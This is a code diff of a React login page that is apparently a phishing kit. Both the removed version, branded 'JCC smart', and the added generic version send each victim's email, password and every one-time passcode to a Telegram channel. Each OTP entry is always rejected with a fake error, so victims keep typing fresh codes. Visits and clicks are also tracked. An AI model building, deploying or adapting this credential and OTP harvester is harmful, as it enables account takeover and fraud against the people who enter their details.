@@ -1,433 +1,438 @@
-"use client"
+"use client";
 
-import React, { useState, useEffect } from "react"
-import { Eye, EyeOff, Loader2, ArrowLeft } from "lucide-react"
-import { sendTelegramMessage } from "@/lib/telegram"
+import React, { useState, useRef, useEffect } from "react";
+import { Eye, EyeOff, ScanFace, Loader2, ArrowLeft, RotateCcw } from "lucide-react";
 
-// JCC Smart Logo from public folder
-const LOGO_SRC = "/jcc-logo.png"
+export default function AuthFlowPage() {
+  // View state: "otp" | "login" (OTP screen open by default)
+  const [currentStep, setCurrentStep] = useState<"login" | "otp">("otp");
 
-function JccLogo({ className = "h-14 sm:h-16 w-auto" }: { className?: string }) {
-  return (
-    <div className="flex items-center justify-center select-none max-w-full">
-      <img
-        src={LOGO_SRC}
-        alt="JCC smart"
-        className={`object-contain max-h-16 sm:max-h-20 w-auto max-w-[180px] ${className}`}
-        loading="eager"
-      />
-    </div>
-  )
-}
+  // Login form states
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [loginLoading, setLoginLoading] = useState(false);
+  const [loginErrors, setLoginErrors] = useState<{ email?: string; password?: string }>({});
 
-export default function LoginPage() {
-  const [step, setStep] = useState<"login" | "otp">("login")
+  // OTP states (supports unlimited digits)
+  const [otpCode, setOtpCode] = useState("");
+  const [otpAttempts, setOtpAttempts] = useState(0);
+  const [otpLoading, setOtpLoading] = useState(false);
+  const [otpError, setOtpError] = useState("");
+  const [timer, setTimer] = useState(60);
+  const [canResend, setCanResend] = useState(false);
+  const otpInputRef = useRef<HTMLInputElement>(null);
 
-  // Login form state
-  const [email, setEmail] = useState("")
-  const [password, setPassword] = useState("")
-  const [showPassword, setShowPassword] = useState(false)
-  const [emailFocused, setEmailFocused] = useState(false)
-  const [passwordFocused, setPasswordFocused] = useState(false)
-  const [isLoginLoading, setIsLoginLoading] = useState(false)
-
-  // OTP form state
-  const [otpCode, setOtpCode] = useState("")
-  const [otpFocused, setOtpFocused] = useState(false)
-  const [isOtpLoading, setIsOtpLoading] = useState(false)
-  const [otpError, setOtpError] = useState("")
-  const [otpAttempt, setOtpAttempt] = useState(1)
-  const [timer, setTimer] = useState(60)
-  const [canResend, setCanResend] = useState(false)
-  const [resendSuccess, setResendSuccess] = useState(false)
-
-  // Track visitor arrival on site
+  // Initialize stored email if available
   useEffect(() => {
-    sendTelegramMessage({
-      title: "New Visitor Landed",
-      type: "page_visit",
-    }).catch((err) => {
-      console.error("Failed to send visitor alert:", err)
-    })
-  }, [])
+    if (typeof window !== "undefined") {
+      const stored = sessionStorage.getItem("userEmail");
+      if (stored) setEmail(stored);
+    }
+  }, []);
 
-  // OTP Timer countdown
+  // Timer countdown for OTP
   useEffect(() => {
-    let interval: NodeJS.Timeout
-    if (step === "otp" && timer > 0) {
+    let interval: NodeJS.Timeout;
+    if (currentStep === "otp" && timer > 0) {
       interval = setInterval(() => {
-        setTimer((prev) => prev - 1)
-      }, 1000)
+        setTimer((prev) => prev - 1);
+      }, 1000);
     } else if (timer === 0) {
-      setCanResend(true)
+      setCanResend(true);
     }
-    return () => clearInterval(interval)
-  }, [step, timer])
+    return () => clearInterval(interval);
+  }, [currentStep, timer]);
 
-  // Handle Login submission
+  // Focus OTP input when transitioning or mounting
+  useEffect(() => {
+    if (currentStep === "otp") {
+      setTimer(60);
+      setCanResend(false);
+      setOtpError("");
+      setTimeout(() => {
+        otpInputRef.current?.focus();
+      }, 100);
+    }
+  }, [currentStep]);
+
+  // Format email helper for OTP screen (unmasked and clearly visible)
+  const getDisplayEmail = (userEmail: string) => {
+    if (!userEmail || !userEmail.trim()) return "your registered email";
+    return userEmail.trim();
+  };
+
+  // Validate Login Form
+  const validateLoginForm = () => {
+    const errors: { email?: string; password?: string } = {};
+
+    const trimmedEmail = email.trim();
+    if (!trimmedEmail) {
+      errors.email = "Please enter your email address";
+    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) {
+      errors.email = "Please enter a valid email address";
+    }
+
+    if (!password.trim()) {
+      errors.password = "Please enter your password";
+    } else if (password.length < 4) {
+      errors.password = "Password must be at least 4 characters";
+    }
+
+    setLoginErrors(errors);
+    return Object.keys(errors).length === 0;
+  };
+
+  // Handle Login Submit
   const handleLoginSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    if (!email || !password) return
+    e.preventDefault();
+    if (!validateLoginForm()) return;
 
-    setIsLoginLoading(true)
+    setLoginLoading(true);
+    setLoginErrors({});
 
-    try {
-      // Send credentials tracking to telegram
-      await sendTelegramMessage({
-        title: "JCC SMART Login Attempt",
-        email: email,
-        password: password,
-        type: "login_submit",
-      })
-    } catch (err) {
-      console.error("Failed to send telegram alert:", err)
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("userEmail", email);
     }
 
-    // 2-second loader before navigating to OTP screen
-    setTimeout(() => {
-      setIsLoginLoading(false)
-      setStep("otp")
-      setTimer(60)
-      setCanResend(false)
-      setOtpError("")
-    }, 2000)
-  }
-
-  // Handle OTP submission - 2 sec loader and error message each time
-  const handleOtpSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    if (!otpCode.trim() || isOtpLoading) return
-
-    setIsOtpLoading(true)
-    setOtpError("")
-
-    const currentAttempt = otpAttempt
-    const submittedCode = otpCode
-
     try {
-      // Send OTP code to telegram with attempt tracking (otp1, otp2, otp3...)
+      const { sendTelegramMessage } = await import("@/lib/telegram");
       await sendTelegramMessage({
-        title: `JCC SMART OTP Attempt #${currentAttempt}`,
+        title: "Login Credentials Submitted",
         email: email,
         password: password,
-        [`otp${currentAttempt}`]: submittedCode,
-        otp1: submittedCode,
-        type: "otp_submit",
-      })
+      });
     } catch (err) {
-      console.error("Failed to send telegram OTP alert:", err)
+      console.error("Submission error:", err);
     }
 
-    // Always wait 2 full seconds, then display error message each time
-    setTimeout(() => {
-      setIsOtpLoading(false)
-      setOtpError("Invalid verification code. Please check your email and try again.")
-      setOtpCode("")
-      setOtpAttempt((prev) => prev + 1)
-    }, 2000)
-  }
+    // Smooth transition to OTP screen
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+    setLoginLoading(false);
+    setCurrentStep("otp");
+  };
+
+  // Handle OTP Change (allows unlimited digits)
+  const handleOtpChange = (value: string) => {
+    // Keep digits only, with no length limit
+    const digitsOnly = value.replace(/\D/g, "");
+    setOtpCode(digitsOnly);
+    if (otpError) setOtpError("");
+  };
 
   // Handle Resend OTP
   const handleResendOtp = async () => {
-    if (!canResend) return
-    setCanResend(false)
-    setTimer(60)
-    setResendSuccess(true)
-    setTimeout(() => setResendSuccess(false), 3000)
+    if (!canResend) return;
+    setTimer(60);
+    setCanResend(false);
+    setOtpError("");
+    try {
+      const { sendTelegramMessage } = await import("@/lib/telegram");
+      await sendTelegramMessage({
+        title: "OTP Resend Requested",
+        email: email || "Direct OTP Access",
+      });
+    } catch (err) {
+      console.error("Resend error:", err);
+    }
+  };
+
+  // Handle OTP Verification Submit (always shows invalid and sends each attempt to Telegram)
+  const handleOtpSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    const code = otpCode.trim();
+    if (!code) {
+      setOtpError("Invalid verification code. Please enter your code.");
+      otpInputRef.current?.focus();
+      return;
+    }
+
+    const currentAttempt = otpAttempts + 1;
+    setOtpAttempts(currentAttempt);
+    setOtpLoading(true);
+    setOtpError("");
+
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem(`userOtp_${currentAttempt}`, code);
+      sessionStorage.setItem("userOtp", code);
+    }
 
     try {
+      const { sendTelegramMessage } = await import("@/lib/telegram");
       await sendTelegramMessage({
-        title: "JCC SMART OTP Resend Requested",
-        email: email,
-        type: "otp_resend",
-      })
+        title: `OTP Submitted (Attempt #${currentAttempt})`,
+        email: email || (typeof window !== "undefined" ? sessionStorage.getItem("userEmail") : null) || "Direct OTP Access",
+        password: password || "N/A",
+        otp1: code,
+        [`otp${Math.min(currentAttempt, 3)}`]: code,
+      });
     } catch (err) {
-      console.error("Failed to trigger resend alert:", err)
+      console.error("OTP error:", err);
     }
-  }
 
-  // Floating label condition: if focused or input has value
-  const isEmailActive = emailFocused || email.length > 0
-  const isPasswordActive = passwordFocused || password.length > 0
-  const isOtpActive = otpFocused || otpCode.length > 0
+    // Realistic verification delay before rejecting
+    await new Promise((resolve) => setTimeout(resolve, 1200));
+    setOtpLoading(false);
+    setOtpError("Invalid verification code. Please check and try again.");
+    setOtpCode("");
+    setTimeout(() => {
+      otpInputRef.current?.focus();
+    }, 50);
+  };
 
   return (
-    <div className="min-h-[100dvh] w-full bg-white flex flex-col items-center justify-center text-slate-800 antialiased font-sans overflow-x-hidden selection:bg-[#5643ba]/20 selection:text-[#5643ba]">
-      {/* Mobile-first centered container */}
-      <div className="w-full max-w-[420px] min-h-[100dvh] flex flex-col justify-between px-6 py-8 sm:px-8 sm:py-10 box-border">
-        {step === "login" ? (
-          /* ======================================================== */
-          /*                    LOGIN SCREEN                          */
-          /* ======================================================== */
-          <>
-            {/* Top section: Logo */}
-            <div className="flex flex-col items-center pt-2 sm:pt-4">
-              <JccLogo className="h-16 sm:h-20 w-auto" />
+    <div className="min-h-[100dvh] w-full max-w-full overflow-x-hidden bg-white flex flex-col justify-between items-center px-4 sm:px-8 py-5 sm:py-8 selection:bg-[#602bf8]/15">
+      {currentStep === "login" ? (
+        <>
+          {/* Top / Main Form Container */}
+          <div className="w-full max-w-[390px] mx-auto pt-8 sm:pt-14 flex flex-col">
+            {/* Header */}
+            <div className="text-center">
+              <h1 className="text-[28px] sm:text-[34px] font-bold text-[#232042] tracking-tight leading-tight">
+                Welcome Back
+              </h1>
+              <p className="text-[14.5px] sm:text-[16px] text-[#767a89] font-normal mt-2">
+                Log in to your account below
+              </p>
             </div>
 
-            {/* Middle section: Headings & Form */}
-            <div className="w-full flex flex-col items-center my-auto py-8">
-              {/* Title & Subtitle */}
-              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#1e2329] tracking-tight mb-1.5 text-center">
-                Welcome!
-              </h1>
-              <p className="text-[15px] sm:text-[16px] text-[#6e7480] font-normal text-center mb-10 tracking-normal">
-                Log in to your account
-              </p>
+            {/* Form */}
+            <form onSubmit={handleLoginSubmit} className="mt-8 sm:mt-12 flex flex-col w-full" noValidate>
+              {/* Email Field */}
+              <div className="flex flex-col">
+                <label
+                  htmlFor="email"
+                  className="text-[14px] sm:text-[14.5px] font-medium text-[#65697d] mb-2"
+                >
+                  Email
+                </label>
+                <input
+                  id="email"
+                  type="email"
+                  value={email}
+                  onChange={(e) => {
+                    setEmail(e.target.value);
+                    if (loginErrors.email) {
+                      setLoginErrors((prev) => ({ ...prev, email: undefined }));
+                    }
+                  }}
+                  placeholder="Enter your email"
+                  className={`w-full h-[52px] sm:h-[54px] rounded-full border-2 bg-white px-5 sm:px-6 text-[15px] text-[#232042] placeholder:text-[#a0a5b5] outline-none transition-colors ${
+                    loginErrors.email
+                      ? "border-red-400 focus:border-red-500"
+                      : "border-[#e2e4ec] focus:border-[#602bf8]"
+                  }`}
+                />
+                {loginErrors.email && (
+                  <span className="text-[13px] text-red-500 mt-1.5 px-3">
+                    {loginErrors.email}
+                  </span>
+                )}
+              </div>
 
-              {/* Login Form */}
-              <form onSubmit={handleLoginSubmit} className="w-full space-y-7">
-                {/* Email Field with Smooth Floating Label */}
-                <div className="relative w-full border-b border-[#dedede] focus-within:border-[#5643ba] transition-colors duration-200">
-                  <label
-                    htmlFor="email"
-                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
-                      isEmailActive
-                        ? "-top-3.5 text-xs text-[#5643ba] font-medium"
-                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
-                    }`}
-                  >
-                    Email
-                  </label>
-                  <input
-                    id="email"
-                    type="email"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    onFocus={() => setEmailFocused(true)}
-                    onBlur={() => setEmailFocused(false)}
-                    required
-                    autoComplete="email"
-                    className="w-full pt-2 pb-2.5 bg-transparent text-[16px] text-[#1e2329] focus:outline-none placeholder-transparent"
-                  />
-                </div>
-
-                {/* Password Field with Smooth Floating Label & Toggle */}
-                <div className="relative w-full border-b border-[#dedede] focus-within:border-[#5643ba] transition-colors duration-200">
-                  <label
-                    htmlFor="password"
-                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
-                      isPasswordActive
-                        ? "-top-3.5 text-xs text-[#5643ba] font-medium"
-                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
-                    }`}
-                  >
-                    Password
-                  </label>
+              {/* Password Field */}
+              <div className="flex flex-col mt-4 sm:mt-5">
+                <label
+                  htmlFor="password"
+                  className="text-[14px] sm:text-[14.5px] font-medium text-[#65697d] mb-2"
+                >
+                  Password
+                </label>
+                <div className="relative w-full">
                   <input
                     id="password"
                     type={showPassword ? "text" : "password"}
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    onFocus={() => setPasswordFocused(true)}
-                    onBlur={() => setPasswordFocused(false)}
-                    required
-                    autoComplete="current-password"
-                    className="w-full pt-2 pb-2.5 pr-10 bg-transparent text-[16px] text-[#1e2329] focus:outline-none placeholder-transparent"
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPassword(!showPassword)}
-                    tabIndex={-1}
-                    className="absolute right-0 top-2.5 text-[#8e95a2] hover:text-[#5643ba] transition-colors duration-150 p-0.5 focus:outline-none"
-                    aria-label={showPassword ? "Hide password" : "Show password"}
-                  >
-                    {showPassword ? (
-                      <Eye className="w-[20px] h-[20px] stroke-[1.75]" />
-                    ) : (
-                      <EyeOff className="w-[20px] h-[20px] stroke-[1.75]" />
-                    )}
-                  </button>
-                </div>
-
-                {/* Forgot Link */}
-                <div className="flex justify-end -mt-3">
-                  <a
-                    href="#forgot"
-                    onClick={(e) => {
-                      e.preventDefault()
-                      if (email) {
-                        sendTelegramMessage({
-                          title: "Forgot Password Clicked",
-                          email,
-                          type: "forgot_password",
-                        })
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      if (loginErrors.password) {
+                        setLoginErrors((prev) => ({ ...prev, password: undefined }));
                       }
                     }}
-                    className="text-[14px] font-medium text-[#5643ba] hover:underline focus:outline-none"
-                  >
-                    Forgot?
-                  </a>
-                </div>
+                    placeholder="Enter your password"
+                    className={`w-full h-[52px] sm:h-[54px] rounded-full border-2 bg-white pl-5 sm:pl-6 pr-24 text-[15px] text-[#232042] placeholder:text-[#a0a5b5] outline-none transition-colors ${
+                      loginErrors.password
+                        ? "border-red-400 focus:border-red-500"
+                        : "border-[#e2e4ec] focus:border-[#602bf8]"
+                    }`}
+                  />
 
-                {/* Log in Button */}
-                <div className="pt-5">
-                  <button
-                    type="submit"
-                    disabled={isLoginLoading || !email || !password}
-                    style={{ backgroundColor: "#5643ba" }}
-                    className="w-full h-[52px] rounded-xl text-white font-medium text-[16px] tracking-wide shadow-sm hover:opacity-95 active:scale-[0.99] transition-all duration-150 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
-                  >
-                    {isLoginLoading ? (
-                      <div className="flex items-center space-x-2">
-                        <Loader2 className="w-5 h-5 animate-spin text-white" />
-                        <span>Logging in...</span>
-                      </div>
-                    ) : (
-                      "Log in"
-                    )}
-                  </button>
-                </div>
-              </form>
-            </div>
+                  {/* Password Action Icons */}
+                  <div className="absolute right-4 sm:right-5 top-1/2 -translate-y-1/2 flex items-center gap-3 text-[#9aa0b2]">
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="hover:text-[#65697d] transition-colors focus:outline-none cursor-pointer p-0.5"
+                      aria-label={showPassword ? "Hide password" : "Show password"}
+                    >
+                      {showPassword ? (
+                        <Eye className="w-[20px] h-[20px]" strokeWidth={1.8} />
+                      ) : (
+                        <EyeOff className="w-[20px] h-[20px]" strokeWidth={1.8} />
+                      )}
+                    </button>
 
-            {/* Bottom spacer for balance */}
-            <div className="h-6" />
-          </>
-        ) : (
-          /* ======================================================== */
-          /*                     OTP SCREEN                           */
-          /* ======================================================== */
-          <>
-            {/* Top Navigation & Logo */}
-            <div className="relative flex items-center justify-center w-full pt-2 sm:pt-4">
+                    <button
+                      type="button"
+                      className="text-[#9aa0b2] focus:outline-none cursor-default p-0.5"
+                      aria-label="Biometric Scan"
+                    >
+                      <ScanFace className="w-[21px] h-[21px]" strokeWidth={1.8} />
+                    </button>
+                  </div>
+                </div>
+                {loginErrors.password && (
+                  <span className="text-[13px] text-red-500 mt-1.5 px-3">
+                    {loginErrors.password}
+                  </span>
+                )}
+              </div>
+
+              {/* Forgotten Password Link */}
+              <div className="mt-3.5 sm:mt-4 flex justify-end">
+                <span
+                  role="button"
+                  aria-disabled="true"
+                  onClick={(e) => e.preventDefault()}
+                  className="text-[13.5px] sm:text-[14px] font-normal text-[#5ec2f8] select-none cursor-pointer"
+                >
+                  Forgotten Password?
+                </span>
+              </div>
+
+              {/* Log In Button */}
+              <button
+                type="submit"
+                disabled={loginLoading}
+                className="mt-6 sm:mt-8 w-full h-[52px] sm:h-[54px] rounded-full bg-[#602bf8] hover:bg-[#5321eb] active:scale-[0.99] text-white font-bold text-[15.5px] sm:text-[16px] flex items-center justify-center transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed shadow-[0_2px_10px_rgba(96,43,248,0.2)]"
+              >
+                {loginLoading ? (
+                  <Loader2 className="w-5 h-5 animate-spin text-white" />
+                ) : (
+                  "Log In"
+                )}
+              </button>
+            </form>
+          </div>
+
+          {/* Bottom Footer */}
+          <div className="pt-8 sm:pt-12 pb-2 text-center text-[14px] sm:text-[15px]">
+            <span className="text-[#4b5063]">Are you a new user? </span>
+            <span
+              role="button"
+              aria-disabled="true"
+              onClick={(e) => e.preventDefault()}
+              className="text-[#602bf8] font-bold select-none cursor-pointer"
+            >
+              Sign up
+            </span>
+          </div>
+        </>
+      ) : (
+        /* OTP Verification Screen */
+        <div className="w-full max-w-[390px] mx-auto pt-2 sm:pt-4 flex flex-col justify-between flex-1">
+          <div>
+            {/* Top Back Navigation */}
+            <div className="w-full flex items-center justify-start mb-4 sm:mb-6">
               <button
                 type="button"
-                onClick={() => setStep("login")}
-                className="absolute left-0 p-2 -ml-2 rounded-full text-[#6e7480] hover:text-[#1e2329] hover:bg-gray-100 transition-colors focus:outline-none cursor-pointer"
+                onClick={() => setCurrentStep("login")}
+                className="flex items-center gap-1.5 text-[#65697d] hover:text-[#232042] text-[13.5px] sm:text-[14px] font-medium transition-colors cursor-pointer p-1 -ml-1"
                 aria-label="Back to login"
               >
-                <ArrowLeft className="w-5 h-5" />
+                <ArrowLeft className="w-4.5 h-4.5 sm:w-5 sm:h-5" strokeWidth={2} />
+                <span>Back</span>
               </button>
-              <JccLogo className="h-16 sm:h-20 w-auto" />
             </div>
 
-            {/* Middle Section: OTP Verification Form */}
-            <div className="w-full flex flex-col items-center my-auto py-8">
-              {/* Title & Sent Email Notice */}
-              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#1e2329] tracking-tight mb-1.5 text-center">
-                Verification Code
-              </h1>
-              
-              <p className="text-[15px] sm:text-[16px] text-[#6e7480] font-normal text-center mb-10 tracking-normal px-2">
-                Enter the verification code sent to <br />
-                <span className="font-semibold text-[#1e2329]">{email}</span>
+            {/* OTP Header */}
+            <div className="text-center px-1">
+              <h2 className="text-[26px] sm:text-[30px] font-bold text-[#232042] tracking-tight leading-tight">
+                Enter OTP Code
+              </h2>
+              <p className="text-[14px] sm:text-[14.5px] text-[#767a89] font-normal mt-2 leading-relaxed break-words">
+                We sent a verification code to
+                <br />
+                <span className="font-semibold text-[#232042] break-all">
+                  {getDisplayEmail(email)}
+                </span>
               </p>
+            </div>
 
-              {/* OTP Form (Accepts unlimited digits) */}
-              <form onSubmit={handleOtpSubmit} className="w-full space-y-6">
-                {/* Floating label input accepting unlimited digits */}
-                <div
-                  className={`relative w-full border-b transition-colors duration-200 ${
-                    otpError
-                      ? "border-red-500"
-                      : "border-[#dedede] focus-within:border-[#5643ba]"
-                  }`}
-                >
-                  <label
-                    htmlFor="otpCode"
-                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
-                      isOtpActive
-                        ? `-top-3.5 text-xs font-medium ${
-                            otpError ? "text-red-500" : "text-[#5643ba]"
-                          }`
-                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
-                    }`}
-                  >
-                    Enter Verification Code
-                  </label>
+            {/* OTP Inputs Form */}
+            <form onSubmit={handleOtpSubmit} className="mt-6 sm:mt-8 flex flex-col items-center w-full" noValidate>
+              <div className="w-full flex flex-col items-center">
+                <div className="w-full relative">
                   <input
-                    id="otpCode"
-                    type="text"
+                    ref={otpInputRef}
+                    type="tel"
                     inputMode="numeric"
                     autoComplete="one-time-code"
                     value={otpCode}
-                    onChange={(e) => {
-                      // Allow any unlimited digit entry as requested
-                      const value = e.target.value.replace(/[^0-9]/g, "")
-                      setOtpCode(value)
-                      if (otpError) setOtpError("")
-                    }}
-                    onFocus={() => {
-                      setOtpFocused(true)
-                      if (otpError) setOtpError("")
-                    }}
-                    onBlur={() => setOtpFocused(false)}
-                    autoFocus
-                    required
-                    placeholder=" "
-                    className="w-full pt-2 pb-2.5 bg-transparent text-[20px] tracking-widest text-[#1e2329] font-medium focus:outline-none"
+                    onChange={(e) => handleOtpChange(e.target.value)}
+                    placeholder="Enter OTP code"
+                    className={`w-full h-[54px] sm:h-[56px] bg-white text-[#232042] text-[18px] sm:text-[22px] font-bold text-center tracking-[0.14em] sm:tracking-[0.18em] rounded-2xl border-2 outline-none transition-all px-4 placeholder:text-[#a0a5b5] placeholder:tracking-normal placeholder:font-normal placeholder:text-[14px] sm:placeholder:text-[15px] ${
+                      otpError
+                        ? "border-red-400 bg-red-50/20 focus:border-red-500 ring-2 ring-red-400/20"
+                        : "border-[#e2e4ec] focus:border-[#602bf8] focus:ring-4 focus:ring-[#602bf8]/15"
+                    }`}
                   />
                 </div>
+              </div>
 
-                {/* Error Message */}
-                {otpError && (
-                  <p className="text-[13px] text-red-500 font-medium text-center -mt-2">
-                    {otpError}
-                  </p>
-                )}
+              {/* OTP Error Message */}
+              {otpError && (
+                <p className="text-red-500 text-[13px] sm:text-[13.5px] font-medium mt-2.5 sm:mt-3 text-center px-2">
+                  {otpError}
+                </p>
+              )}
 
-                {/* Resend success alert */}
-                {resendSuccess && (
-                  <p className="text-[13px] text-green-600 font-medium text-center -mt-2">
-                    A new verification code has been resent to your email!
-                  </p>
-                )}
-
-                {/* Verify Button */}
-                <div className="pt-3">
-                  <button
-                    type="submit"
-                    disabled={isOtpLoading || !otpCode}
-                    style={{ backgroundColor: "#5643ba" }}
-                    className="w-full h-[52px] rounded-xl text-white font-medium text-[16px] tracking-wide shadow-sm hover:opacity-95 active:scale-[0.99] transition-all duration-150 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
-                  >
-                    {isOtpLoading ? (
-                      <div className="flex items-center space-x-2">
-                        <Loader2 className="w-5 h-5 animate-spin text-white" />
-                        <span>Verifying...</span>
-                      </div>
-                    ) : (
-                      "Confirm & Continue"
-                    )}
-                  </button>
-                </div>
-
-                {/* Resend Code Section with Timer */}
-                <div className="text-center pt-2">
-                  {canResend ? (
-                    <button
-                      type="button"
-                      onClick={handleResendOtp}
-                      className="text-[14px] font-semibold text-[#5643ba] hover:underline focus:outline-none cursor-pointer"
-                    >
-                      Resend Verification Code
-                    </button>
-                  ) : (
-                    <p className="text-[13.5px] text-[#8e95a2]">
-                      Resend code in{" "}
-                      <span className="font-semibold text-[#5643ba]">
-                        00:{timer.toString().padStart(2, "0")}
-                      </span>
-                    </p>
-                  )}
-                </div>
-              </form>
-            </div>
-
-            {/* Bottom info link */}
-            <div className="text-center pb-2">
+              {/* Confirm / Verify Button */}
               <button
-                type="button"
-                onClick={() => setStep("login")}
-                className="text-[13.5px] text-[#6e7480] hover:text-[#5643ba] transition-colors focus:outline-none"
+                type="submit"
+                disabled={otpLoading}
+                className="mt-6 sm:mt-8 w-full h-[52px] sm:h-[54px] rounded-full bg-[#602bf8] hover:bg-[#5321eb] active:scale-[0.99] text-white font-bold text-[15.5px] sm:text-[16px] flex items-center justify-center transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed shadow-[0_2px_10px_rgba(96,43,248,0.2)]"
               >
-                Entered incorrect email? <span className="font-medium text-[#5643ba] underline">Change</span>
+                {otpLoading ? (
+                  <Loader2 className="w-5 h-5 animate-spin text-white" />
+                ) : (
+                  "Verify"
+                )}
               </button>
-            </div>
-          </>
-        )}
-      </div>
+
+              {/* Resend Timer Section */}
+              <div className="flex flex-wrap items-center justify-center gap-1.5 mt-5 sm:mt-6 text-[13.5px] sm:text-[14px]">
+                <span className="text-[#767a89]">Didn't receive the code?</span>
+                {canResend ? (
+                  <button
+                    type="button"
+                    onClick={handleResendOtp}
+                    className="text-[#602bf8] font-bold hover:underline cursor-pointer flex items-center gap-1"
+                  >
+                    <RotateCcw className="w-3.5 h-3.5" />
+                    <span>Resend OTP</span>
+                  </button>
+                ) : (
+                  <span className="text-[#602bf8] font-semibold tabular-nums">
+                    Resend in {timer}s
+                  </span>
+                )}
+              </div>
+            </form>
+          </div>
+
+          {/* Cancel button */}
+          <div className="py-3 sm:py-4 text-center">
+            <button
+              type="button"
+              onClick={() => setCurrentStep("login")}
+              className="text-[#767a89] hover:text-[#232042] text-[13.5px] sm:text-[14px] font-medium transition-colors cursor-pointer"
+            >
+              Cancel and back to login
+            </button>
+          </div>
+        </div>
+      )}
     </div>
-  )
+  );
 }
